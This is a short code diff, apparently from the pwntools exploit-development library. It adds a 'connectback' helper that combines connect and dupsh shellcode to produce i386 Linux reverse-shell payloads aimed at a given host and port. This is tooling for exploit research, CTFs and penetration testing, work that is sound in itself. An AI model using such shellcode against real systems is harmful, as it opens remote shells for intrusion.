@@ -1,4 +1,13 @@
 from pwn.shellcode_helper import *
+from .. import dupsh
+
+@shellcode_reqs(arch='i386', os='linux', network='ipv4')
+def connectback(host, port):
+    """Args: host, port
+    Standard connect back type shellcode."""
+    return \
+        connect(host, port) + \
+        dupsh()
 
 @shellcode_reqs(arch='i386', os='linux', network='ipv4')
 def connect(host, port):
